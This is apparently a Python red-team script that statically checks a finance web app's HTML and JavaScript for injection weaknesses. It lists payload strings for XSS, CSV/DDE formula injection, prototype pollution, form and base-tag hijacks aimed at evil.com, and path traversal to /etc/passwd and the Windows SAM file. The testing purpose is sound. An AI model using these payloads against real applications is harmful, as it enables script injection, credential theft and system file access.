#!/usr/bin/env python3
"""
FlowFinance RED TEAM Security Test
===================================
Adversarial testing of parsers and input handling
"""

import re
import json
from pathlib import Path

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

def print_header(text):
    print(f"\n{BOLD}{MAGENTA}{'='*60}{RESET}")
    print(f"{BOLD}{MAGENTA}🔴 {text}{RESET}")
    print(f"{BOLD}{MAGENTA}{'='*60}{RESET}")

def print_attack(name, payload, result, safe):
    status = f"{GREEN}BLOCKED{RESET}" if safe else f"{RED}VULNERABLE{RESET}"
    print(f"  [{status}] {name}")
    print(f"           Payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
    if not safe:
        print(f"           {RED}⚠ {result}{RESET}")

def print_safe(text):
    print(f"  {GREEN}✓{RESET} {text}")

def print_vuln(text):
    print(f"  {RED}✗{RESET} {text}")

def print_info(text):
    print(f"  {BLUE}ℹ{RESET} {text}")


class RedTeamTester:
    def __init__(self, html_path):
        self.html_path = Path(html_path)
        self.html_content = self.html_path.read_text(encoding='utf-8')
        self.js_content = self._extract_js()
        self.vulnerabilities = []

    def _extract_js(self):
        """Extract JavaScript from HTML"""
        pattern = r'<script>(.+?)</script>'
        matches = re.findall(pattern, self.html_content, re.DOTALL)
        return '\n'.join(matches)

    def run_all(self):
        """Run all red team tests"""
        print(f"\n{BOLD}{RED}🔴 FlowFinance RED TEAM Security Assessment{RESET}")
        print(f"Target: {self.html_path}")

        self.test_xss_in_parsers()
        self.test_csv_injection()
        self.test_prototype_pollution()
        self.test_regex_dos()
        self.test_json_injection()
        self.test_html_injection()
        self.test_template_injection()
        self.test_path_traversal()
        self.test_integer_overflow()
        self.test_indexeddb_injection()
        self.test_dom_clobbering()
        self.test_unicode_exploits()

        self.print_report()

    def test_xss_in_parsers(self):
        """Test XSS vulnerabilities in file parsers"""
        print_header("XSS Attack Vectors in Parsers")

        xss_payloads = [
            ('<script>alert(1)</script>', 'Basic script injection'),
            ('<img src=x onerror=alert(1)>', 'IMG onerror'),
            ('<svg onload=alert(1)>', 'SVG onload'),
            ('"><script>alert(1)</script>', 'Attribute breakout'),
            ("'><script>alert(1)</script>", 'Single quote breakout'),
            ('<body onload=alert(1)>', 'Body onload'),
            ('<iframe src="javascript:alert(1)">', 'Iframe javascript'),
            ('<a href="javascript:alert(1)">click</a>', 'Anchor javascript'),
            ('<div style="background:url(javascript:alert(1))">', 'CSS javascript'),
            ('{{constructor.constructor("alert(1)")()}}}', 'Angular sandbox escape'),
            ('${alert(1)}', 'Template literal'),
            ('<math><maction actiontype="statusline#http://google.com">click</maction></math>', 'MathML'),
        ]

        # Check if innerHTML is used with user data
        innerHTML_uses = re.findall(r'\.innerHTML\s*=\s*[^;]+', self.js_content)

        for payload, name in xss_payloads:
            # Check if payload would be escaped
            is_safe = True
            reason = "Payload would be escaped/blocked"

            # Check for dangerous patterns
            if 'innerHTML' in self.js_content:
                # Look for escaping
                if 'textContent' in self.js_content or 'createTextNode' in self.js_content:
                    is_safe = True
                elif 'replace(' in self.js_content and ('&lt;' in self.js_content or '<' in self.js_content):
                    is_safe = True
                else:
                    # Check specific innerHTML assignments
                    for use in innerHTML_uses:
                        if '${' in use or '+ ' in use or ' +' in use:
                            if 'escap' not in use.lower() and 'sanitiz' not in use.lower():
                                is_safe = False
                                reason = f"innerHTML with dynamic content: {use[:40]}"
                                break

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"XSS: {name}")

    def test_csv_injection(self):
        """Test CSV formula injection"""
        print_header("CSV Formula Injection")

        csv_payloads = [
            ('=CMD|"/C calc"!A0', 'Windows calc via DDE'),
            ('=HYPERLINK("http://evil.com")', 'Hyperlink injection'),
            ('+cmd|" /C notepad"!"A1"', 'Plus formula'),
            ('-cmd|" /C notepad"!"A1"', 'Minus formula'),
            ('@SUM(1+1)*cmd|" /C calc"!A0', 'At formula'),
            ('=1+1', 'Simple formula'),
        ]

        # Check CSV export code
        export_code = re.search(r'exportData[^}]+}', self.js_content, re.DOTALL)

        for payload, name in csv_payloads:
            is_safe = True
            reason = "Formula characters escaped"

            if export_code:
                code = export_code.group()
                # Check if values are escaped - look for escapeCSV function or formula char detection
                has_escape = (
                    'escapeCSV' in code or
                    r"^[=+\-@" in self.js_content or
                    ('replace' in code and '"' in code) or
                    "startsWith('=')" in self.js_content
                )
                if not has_escape:
                    is_safe = False
                    reason = "No escaping in CSV export"

            # Check if import sanitizes
            if '=CMD' in payload or payload.startswith('='):
                # Look for formula stripping or escaping
                has_protection = (
                    'escapeCSV' in self.js_content or
                    r"^[=+\-@" in self.js_content or
                    'startsWith' in self.js_content or
                    'trim()' in self.js_content
                )
                if not has_protection:
                    is_safe = False
                    reason = "Formula prefix not stripped on import"

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"CSV Injection: {name}")

    def test_prototype_pollution(self):
        """Test prototype pollution vulnerabilities"""
        print_header("Prototype Pollution")

        pollution_payloads = [
            ('{"__proto__": {"admin": true}}', '__proto__ injection'),
            ('{"constructor": {"prototype": {"admin": true}}}', 'Constructor pollution'),
            ('{"__proto__": {"toString": "pwned"}}', 'toString pollution'),
        ]

        # Check for Object.assign or spread with user data
        dangerous_patterns = [
            r'Object\.assign\s*\(\s*\{\}',
            r'\.\.\.\s*\w+',  # Spread operator
            r'JSON\.parse\s*\([^)]*\)',
        ]

        has_protection = False
        if 'Object.freeze' in self.js_content or 'Object.seal' in self.js_content:
            has_protection = True
        if 'hasOwnProperty' in self.js_content:
            has_protection = True

        for payload, name in pollution_payloads:
            is_safe = has_protection or 'prototype' not in self.js_content.lower()
            reason = "Prototype pollution vectors present" if not is_safe else "Protected"

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"Prototype Pollution: {name}")

    def test_regex_dos(self):
        """Test Regular Expression Denial of Service"""
        print_header("ReDoS (Regex Denial of Service)")

        # Find all regex patterns in code
        regex_patterns = re.findall(r'/([^/]+)/[gimsuvy]*', self.js_content)
        regex_patterns += re.findall(r'new RegExp\([\'"]([^\'"]+)', self.js_content)

        redos_patterns = []
        for pattern in regex_patterns:
            # Check for nested quantifiers (common ReDoS pattern)
            if re.search(r'\(.+\+\)\+', pattern) or \
               re.search(r'\(.+\*\)\*', pattern) or \
               re.search(r'\(.+\+\)\*', pattern) or \
               re.search(r'\(.+\*\)\+', pattern):
                redos_patterns.append(pattern)

        if not redos_patterns:
            print_safe("No obvious ReDoS vulnerable patterns found")
        else:
            for pattern in redos_patterns:
                print_vuln(f"Potential ReDoS: /{pattern}/")
                self.vulnerabilities.append(f"ReDoS: {pattern}")

    def test_json_injection(self):
        """Test JSON injection in data handling"""
        print_header("JSON Injection")

        json_payloads = [
            ('{"a":"b","admin":true}', 'Extra property injection'),
            ('{"a":"b"}/**/{"admin":true}', 'Comment injection'),
            ('{"a":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}', 'Unicode escape XSS'),
        ]

        # Check JSON parsing
        json_parse = 'JSON.parse' in self.js_content

        for payload, name in json_payloads:
            is_safe = True
            reason = "JSON properly parsed"

            # JSON.parse is generally safe, but check for eval
            if 'eval(' in self.js_content:
                is_safe = False
                reason = "eval() used - could parse arbitrary code"

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"JSON Injection: {name}")

    def test_html_injection(self):
        """Test HTML injection vectors"""
        print_header("HTML Injection")

        html_payloads = [
            ('<div onclick="alert(1)">click me</div>', 'Clickjacking div'),
            ('<form action="http://evil.com"><input name="password"></form>', 'Form hijack'),
            ('<base href="http://evil.com">', 'Base tag injection'),
            ('<meta http-equiv="refresh" content="0;url=http://evil.com">', 'Meta refresh'),
            ('<link rel="import" href="http://evil.com/evil.html">', 'HTML import'),
        ]

        for payload, name in html_payloads:
            is_safe = True
            reason = "HTML properly escaped"

            # Check innerHTML usage patterns
            if '.innerHTML' in self.js_content:
                # Look for text-based assignment
                innerHTML_count = self.js_content.count('.innerHTML')
                textContent_count = self.js_content.count('.textContent')

                if innerHTML_count > textContent_count + 5:
                    is_safe = False
                    reason = f"Heavy innerHTML usage ({innerHTML_count} vs {textContent_count} textContent)"

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"HTML Injection: {name}")

    def test_template_injection(self):
        """Test template injection vulnerabilities"""
        print_header("Template Injection")

        template_payloads = [
            ('${7*7}', 'ES6 template literal'),
            ('{{7*7}}', 'Mustache/Angular'),
            ('#{7*7}', 'Ruby ERB style'),
            ('${constructor.constructor("return this")()}', 'Sandbox escape'),
        ]

        # Check for template literal usage with user data
        template_usage = re.findall(r'`[^`]*\$\{[^}]+\}[^`]*`', self.js_content)

        # Check if sanitize function exists and is used
        has_sanitize = 'const sanitize' in self.js_content or 'function sanitize' in self.js_content
        sanitize_used = 'sanitize(' in self.js_content

        for payload, name in template_payloads:
            is_safe = True
            reason = "Template injection not possible"

            # Check if user data flows into template literals
            for template in template_usage:
                if 'description' in template.lower() or 'input' in template.lower():
                    # Check if sanitize() wraps the user data
                    if has_sanitize and sanitize_used and 'sanitize(' in template:
                        is_safe = True
                        reason = "User data sanitized before template"
                    else:
                        is_safe = False
                        reason = f"User data in template: {template[:40]}"
                    break

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"Template Injection: {name}")

    def test_path_traversal(self):
        """Test path traversal in file handling"""
        print_header("Path Traversal")

        traversal_payloads = [
            ('../../../etc/passwd', 'Unix path traversal'),
            ('..\\..\\..\\windows\\system32\\config\\sam', 'Windows traversal'),
            ('....//....//....//etc/passwd', 'Double encoding'),
            ('%2e%2e%2f%2e%2e%2f', 'URL encoded traversal'),
        ]

        # Client-side file handling doesn't typically have path traversal
        # But check for any file path handling
        has_file_ops = 'FileReader' in self.js_content or 'file' in self.js_content.lower()

        for payload, name in traversal_payloads:
            is_safe = True
            reason = "Client-side only - no server file access"

            if 'fetch(' in self.js_content:
                # Check if user input goes to fetch
                fetch_patterns = re.findall(r'fetch\s*\([^)]+\)', self.js_content)
                for pattern in fetch_patterns:
                    if '+' in pattern or '${' in pattern:
                        is_safe = False
                        reason = "Dynamic URL in fetch"
                        break

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"Path Traversal: {name}")

    def test_integer_overflow(self):
        """Test integer overflow handling"""
        print_header("Integer Overflow / Numeric Limits")

        overflow_payloads = [
            ('9999999999999999999999', 'Large integer'),
            ('-9999999999999999999999', 'Large negative'),
            ('1e308', 'Near infinity'),
            ('1e-324', 'Near zero'),
            ('NaN', 'Not a Number'),
            ('Infinity', 'Infinity value'),
        ]

        for payload, name in overflow_payloads:
            is_safe = True
            reason = "Numeric validation present"

            # Check for isNaN, isFinite checks
            if 'isNaN' not in self.js_content and 'Number.isNaN' not in self.js_content:
                if 'NaN' in payload:
                    is_safe = False
                    reason = "No NaN validation found"

            if 'isFinite' not in self.js_content and 'Number.isFinite' not in self.js_content:
                if 'Infinity' in payload or 'e308' in payload:
                    is_safe = False
                    reason = "No Infinity validation found"

            # Check for max value limits
            if 'max=' in self.html_content or 'MAX' in self.js_content:
                is_safe = True

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"Numeric: {name}")

    def test_indexeddb_injection(self):
        """Test IndexedDB security"""
        print_header("IndexedDB Security")

        # Check IndexedDB usage patterns
        idb_patterns = [
            ('Key manipulation', r'\.put\s*\([^,]+,\s*[^)]+\)', 'Object store put'),
            ('Index queries', r'\.index\s*\([\'"][^\'"]+[\'"]\)', 'Index access'),
            ('Transaction scope', r'transaction\s*\(\s*\[[^\]]+\]', 'Transaction creation'),
        ]

        print_info("IndexedDB is client-side only - limited attack surface")

        # Check if keys are validated
        if 'objectStore' in self.js_content:
            if 'typeof' in self.js_content or 'instanceof' in self.js_content:
                print_safe("Type checking present for data operations")
            else:
                print_info("Consider adding type validation for stored data")

        # Check for proper error handling
        if 'onerror' in self.js_content or '.catch' in self.js_content:
            print_safe("Error handling present for IndexedDB operations")
        else:
            print_vuln("Missing error handling for IndexedDB")
            self.vulnerabilities.append("IndexedDB: Missing error handling")

    def test_dom_clobbering(self):
        """Test DOM clobbering vulnerabilities"""
        print_header("DOM Clobbering")

        clobbering_vectors = [
            ('<img name="createElement">', 'Override createElement'),
            ('<form id="document"><input name="cookie"></form>', 'Document property'),
            ('<img name="location" src="//evil.com">', 'Location override'),
        ]

        # Check for getElementById without null checks
        get_element = re.findall(r'getElementById\s*\([\'"][^\'"]+[\'"]\s*\)\.', self.js_content)

        has_null_checks = 'null' in self.js_content or '?.' in self.js_content

        for payload, name in clobbering_vectors:
            is_safe = has_null_checks
            reason = "Missing null checks on DOM access" if not is_safe else "Null checks present"

            print_attack(name, payload, reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"DOM Clobbering: {name}")

    def test_unicode_exploits(self):
        """Test Unicode-based exploits"""
        print_header("Unicode Security")

        unicode_payloads = [
            ('\u0000', 'Null byte'),
            ('\u200B', 'Zero-width space'),
            ('\uFEFF', 'BOM character'),
            ('\u202E', 'RTL override (text direction)'),
            ('\uFF1C\uFF1E', 'Fullwidth angle brackets'),
            ('＜script＞', 'Fullwidth script tag'),
        ]

        for payload, name in unicode_payloads:
            is_safe = True
            reason = "Unicode normalized/handled"

            # Check for Unicode normalization
            if 'normalize' not in self.js_content:
                if '\u202E' in payload:  # RTL override is particularly dangerous
                    is_safe = False
                    reason = "No Unicode normalization - RTL attack possible"

            print_attack(name, repr(payload), reason, is_safe)
            if not is_safe:
                self.vulnerabilities.append(f"Unicode: {name}")

    def print_report(self):
        """Print final security report"""
        print_header("RED TEAM ASSESSMENT REPORT")

        if not self.vulnerabilities:
            print(f"\n  {GREEN}{BOLD}✓ NO CRITICAL VULNERABILITIES FOUND{RESET}")
            print(f"\n  The application appears to handle adversarial inputs safely.")
        else:
            print(f"\n  {RED}{BOLD}⚠ FOUND {len(self.vulnerabilities)} POTENTIAL ISSUES{RESET}\n")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"  {RED}{i}. {vuln}{RESET}")

        print(f"\n{BOLD}Recommendations:{RESET}")
        print(f"  • Continue using textContent over innerHTML where possible")
        print(f"  • Add input sanitization for all user-provided strings")
        print(f"  • Consider adding CSP nonce for inline scripts")
        print(f"  • Implement rate limiting for file imports")
        print(f"  • Add file size limits for uploads")


if __name__ == '__main__':
    import sys
    html_file = sys.argv[1] if len(sys.argv) > 1 else 'flowfinance-beast.html'
    tester = RedTeamTester(html_file)
    tester.run_all()
